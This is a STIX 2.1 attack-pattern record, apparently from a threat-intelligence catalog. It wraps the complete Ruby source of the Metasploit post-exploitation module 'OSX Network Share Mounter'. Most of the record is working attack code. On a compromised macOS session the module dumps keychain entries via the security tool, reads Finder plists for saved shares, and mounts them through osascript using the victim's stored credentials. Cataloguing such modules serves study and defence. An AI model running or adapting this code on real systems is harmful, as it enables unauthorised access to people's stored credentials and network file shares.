{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c353bd52-45ce-4f61-a975-990dfc99e072",
    "created": "2024-08-14T16:33:00.691512Z",
    "modified": "2024-08-14T16:33:00.691516Z",
    "name": "OSX Network Share Mounter",
    "description": " This module lists saved network shares and tries to connect to them using stored credentials. This does not require root privileges.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/osx/manage/mount_share.rb",
            "external_id": "mount_share.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n\n  # list of accepted file share protocols. other \"special\" URLs (like vnc://) will be ignored.\n  FILE_SHARE_PROTOCOLS = %w[smb nfs cifs ftp afp]\n\n  # Used to parse a name property from a plist\n  NAME_REGEXES = [/^Name = \"(.*)\";$/, /^Name = (.*);$/]\n\n  # Used to parse a URL property from a plist\n  URL_REGEX = /^URL = \"(.*)\";$/\n\n  include Msf::Post::File\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'OSX Network Share Mounter',\n        'Description' => %q{\n          This module lists saved network shares and tries to connect to them using stored\n          credentials. This does not require root privileges.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Peter Toth <globetother[at]gmail.com>',\n          'joev'\n        ],\n        'Platform' => [ 'osx' ],\n        'SessionTypes' => [ 'meterpreter', 'shell' ],\n        'Actions' => [\n          [ 'LIST', { 'Description' => 'Show a list of stored network share credentials' } ],\n          [ 'MOUNT', { 'Description' => 'Mount a network shared volume using stored credentials' } ],\n          [ 'UMOUNT', { 'Description' => 'Unmount a mounted volume' } ]\n        ],\n        'DefaultAction' => 'LIST'\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('VOLUME', [true, 'Name of network share volume. `set ACTION LIST` to get a list.', 'localhost']),\n        OptEnum.new('PROTOCOL', [true, 'Network share protocol.', 'smb', FILE_SHARE_PROTOCOLS])\n      ]\n    )\n\n    register_advanced_options(\n      [\n        OptString.new('SECURITY_PATH', [true, 'Path to the security executable.', '/usr/bin/security']),\n        OptString.new('OSASCRIPT_PATH', [true, 'Path to the osascript executable.', '/usr/bin/osascript']),\n        OptString.new('SIDEBAR_PLIST_PATH', [true, 'Path to the finder sidebar plist.', '~/Library/Preferences/com.apple.sidebarlists.plist']),\n        OptString.new('RECENT_PLIST_PATH', [true, 'Path to the finder recent plist.', '~/Library/Preferences/com.apple.recentitems.plist'])\n      ]\n    )\n  end\n\n  def run\n    username = cmd_exec('whoami').strip\n    security_path = datastore['SECURITY_PATH'].shellescape\n    sidebar_plist_path = datastore['SIDEBAR_PLIST_PATH'].gsub(/^~/, \"/Users/#{username}\").shellescape\n    recent_plist_path = datastore['RECENT_PLIST_PATH'].gsub(/^~/, \"/Users/#{username}\").shellescape\n\n    if action.name == 'LIST'\n      if file?(security_path)\n        saved_shares = get_keyring_shares(security_path)\n        if saved_shares.empty?\n          print_status('No Network Share credentials were found in the keyrings')\n        else\n          print_status('Network shares saved in keyrings:')\n          print_status(\"  Protocol\\tShare Name\")\n          saved_shares.each do |line|\n            print_good(\"  #{line}\")\n          end\n        end\n      else\n        print_error('Could not check keyring contents: Security binary not found.')\n      end\n      if file?(sidebar_plist_path)\n        favorite_shares = get_favorite_shares(sidebar_plist_path)\n        if favorite_shares.empty?\n          print_status('No favorite shares were found')\n        else\n          print_status('Favorite shares (without stored credentials):')\n          print_status(\"  Protocol\\tShare Name\")\n          favorite_shares.each do |line|\n            print_uri(line)\n          end\n        end\n      else\n        print_error('Could not check sidebar favorites contents: Sidebar plist not found')\n      end\n      if file?(recent_plist_path)\n        recent_shares = get_recent_shares(recent_plist_path)\n        if recent_shares.empty?\n          print_status('No recent shares were found')\n        else\n          print_status('Recent shares (without stored credentials):')\n          print_status(\"  Protocol\\tShare Name\")\n          recent_shares.each do |line|\n            print_uri(line)\n          end\n        end\n      else\n        print_error('Could not check recent favorites contents: Recent plist not found')\n      end\n      mounted_shares = get_mounted_volumes\n      if mounted_shares.empty?\n        print_status('No volumes found in /Volumes')\n      else\n        print_status('Mounted Volumes:')\n        mounted_shares.each do |line|\n          print_good(\"  #{line}\")\n        end\n      end\n    elsif action.name == 'MOUNT'\n      mount\n    elsif action.name == 'UMOUNT'\n      umount\n    end\n  end\n\n  # Returns the network shares stored in the user's keychain. These shares will often have\n  # creds attached, so mounting occurs without prompting the user for a password.\n  # @return [Array<String>] sorted list of volumes stored in the user's keychain\n  def get_keyring_shares(security_path)\n    # Grep for desc srvr and ptcl\n    data = cmd_exec(\"#{security_path} dump\")\n    lines = data.lines.select { |line| line =~ /desc|srvr|ptcl/ }.map(&:strip)\n\n    # Go through the list, find the saved Network Password descriptions\n    # and their corresponding ptcl and srvr attributes\n    list = []\n    lines.each_with_index do |line, x|\n      # Remove everything up to the double-quote after the equal sign,\n      # and also the trailing double-quote\n      next unless line =~ /\"desc\"<blob>=(\"Network Password\"|<NULL>)/ && x < lines.length - 2 && (lines[x + 1].match \"^.*\\=\\\"(.*)\\w*\\\"\\w*$\")\n\n      protocol = ::Regexp.last_match(1)\n      if protocol.start_with?(*FILE_SHARE_PROTOCOLS) && lines[x + 2].match(\"^.*\\=\\\"(.*)\\\"\\w*$\")\n        server = ::Regexp.last_match(1)\n        list.push(protocol + \"\\t\" + server)\n      end\n    end\n    list.sort\n  end\n\n  # Returns the user's \"Favorite Shares\". To add a Favorite Share on OSX, press cmd-k in Finder, enter\n  # an address, then click the [+] button next to the address field.\n  # @return [Array<String>] sorted list of volumes saved in the user's \"Recent Shares\"\n  def get_favorite_shares(sidebar_plist_path)\n    # Grep for URL\n    data = cmd_exec(\"defaults read #{sidebar_plist_path} favoriteservers\")\n    list = data.lines.map(&:strip).map { |line| line =~ URL_REGEX && ::Regexp.last_match(1) }.compact\n\n    # Grep for EntryType and Name\n    data = cmd_exec(\"defaults read #{sidebar_plist_path} favorites\")\n    lines = data.lines.map(&:strip).select { |line| line =~ /EntryType|Name/ }\n\n    # Go through the list, find the rows with EntryType 8 and their corresponding name\n    lines.each_with_index do |line, x|\n      if line =~ /EntryType = 8;/ && x < lines.length - 1 && NAME_REGEXES.any? { |r| lines[x + 1].strip =~ r }\n        list.push(::Regexp.last_match(1))\n      end\n    end\n\n    list.sort\n  end\n\n  # Returns the user's \"Recent Shares\" list\n  # @return [Array<String>] sorted list of volumes saved in the user's \"Recent Shares\"\n  def get_recent_shares(recent_plist_path)\n    # Grep for Name\n    data = cmd_exec(\"defaults read #{recent_plist_path} Hosts\")\n    data.lines.map(&:strip).map { |line| line =~ URL_REGEX && ::Regexp.last_match(1) }.compact.uniq.sort\n  end\n\n  # @return [Array<String>] sorted list of mounted volume names\n  def get_mounted_volumes\n    cmd_exec('ls /Volumes').lines.map(&:strip).sort\n  end\n\n  def mount\n    share_name = datastore['VOLUME']\n    protocol = datastore['PROTOCOL']\n    print_status(\"Connecting to #{protocol}://#{share_name}\")\n    cmd_exec(\"#{osascript_path} -e 'tell app \\\"finder\\\" to mount volume \\\"#{protocol}://#{share_name}\\\"'\")\n  end\n\n  def umount\n    share_name = datastore['VOLUME']\n    print_status(\"Disconnecting from #{share_name}\")\n    cmd_exec(\"#{osascript_path} -e 'tell app \\\"finder\\\" to eject \\\"#{share_name}\\\"'\")\n  end\n\n  # hook cmd_exec to print a debug message when DEBUG=true\n  def cmd_exec(cmd)\n    vprint_status(cmd)\n    super\n  end\n\n  # Prints a file share url (e.g. smb://joe.com) as Protocol + \\t + Host\n  # @param [String] line the URL to parse and print formatted\n  def print_uri(line)\n    if line =~ %r{^(.*?)://(.*)$}\n      print_good \"  #{::Regexp.last_match(1)}\\t#{::Regexp.last_match(2)}\"\n    else\n      print_good \"  #{line}\"\n    end\n  end\n\n  # path to osascript on the remote system\n  def osascript_path\n    datastore['OSASCRIPT_PATH'].shellescape\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'osx' ]"
    ]
}